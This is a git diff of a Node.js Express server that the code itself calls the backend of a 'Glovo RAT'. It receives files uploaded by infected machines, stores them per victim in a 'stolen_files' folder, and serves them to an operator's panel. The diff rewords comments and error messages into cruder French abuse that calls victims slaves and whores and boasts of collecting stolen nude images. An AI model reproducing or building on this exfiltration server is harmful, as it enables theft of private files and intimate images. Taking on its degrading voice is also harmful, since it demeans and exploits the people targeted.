@@ -7,18 +7,18 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Dossier où stocker les fichiers volés (par victim_id)
+// Dossier où les esclaves envoient leurs nudes et merdes
 const STORAGE_DIR = path.join(__dirname, 'stolen_files');
 fs.ensureDirSync(STORAGE_DIR);
 
 app.use(cors());
 app.use(express.json());
 
-// Multer pour gérer les uploads de fichiers
+// Config Multer pour upload
 const storage = multer.diskStorage({
   destination: (req, file, cb) => {
     const victimId = req.body.victim_id;
-    if (!victimId) return cb(new Error('Pas de victim_id, sale pute'));
+    if (!victimId) return cb(new Error('Pas de victim_id, enculé'));
     
     const victimDir = path.join(STORAGE_DIR, victimId);
     fs.ensureDirSync(victimDir);
@@ -33,7 +33,7 @@ const storage = multer.diskStorage({
 
 const upload = multer({ storage });
 
-// ─── UPLOAD ─── (client envoie fichier vers serveur)
+// UPLOAD : le client RAT envoie fichier
 app.post('/upload', upload.single('file'), (req, res) => {
   const victimId = req.body.victim_id;
   const remotePath = req.body.remote_path;
@@ -42,11 +42,11 @@ app.post('/upload', upload.single('file'), (req, res) => {
     return res.status(400).json({ error: 'victim_id ou file manquant' });
   }
 
-  console.log(`[UPLOAD] ${victimId} → ${remotePath} (${req.file.size} bytes)`);
+  console.log(`[UPLOAD] ${victimId} → ${remotePath} (${req.file.size} octets)`);
   res.status(200).json({ success: true, path: req.file.path });
 });
 
-// ─── DOWNLOAD ─── (serveur renvoie le fichier brut)
+// DOWNLOAD : le panel boss télécharge le fichier volé
 app.get('/download', (req, res) => {
   const victimId = req.query.victim_id;
   const filePath = req.query.path;
@@ -58,18 +58,17 @@ app.get('/download', (req, res) => {
   const fullPath = path.join(STORAGE_DIR, victimId, path.basename(filePath));
 
   if (!fs.existsSync(fullPath)) {
-    return res.status(404).send('Fichier pas trouvé, le loser l’a supprimé');
+    return res.status(404).send('Fichier introuvable, la pute l’a supprimé');
   }
 
   console.log(`[DOWNLOAD] ${victimId} ← ${filePath}`);
   res.download(fullPath, path.basename(filePath), (err) => {
     if (err) {
-      console.error(err);
-      res.status(500).send('Erreur lors du download');
+      res.status(500).send('Erreur download');
     }
   });
 });
 
 app.listen(PORT, () => {
-  console.log(`Backend Glovo RAT prêt à recevoir des nudes sur port ${PORT} 😈🖕`);
+  console.log(`Backend Glovo RAT ouvert sur port ${PORT} - Prêt à recevoir des nudes et des pleurs 😈🖕`);
 });
